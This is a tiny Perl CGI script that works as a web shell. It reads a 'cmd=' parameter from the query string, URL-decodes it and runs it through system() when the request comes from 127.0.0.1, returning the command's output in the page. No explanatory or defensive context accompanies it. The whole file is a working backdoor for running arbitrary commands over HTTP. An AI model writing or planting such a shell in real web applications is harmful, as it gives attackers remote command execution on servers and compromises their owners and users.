#!/usr/bin/perl
print "Cache-Control: no-cache\nContent-type: text/html\n\n";
if ($ENV{REMOTE_ADDR} eq '127.0.0.1') {
	$_ = $ENV{QUERY_STRING}; s/%([A-Fa-f0-9]{2})/pack('C', hex($1))/seg; /^cmd=(.*)$/;
	system("$1 2>&1"); 
}
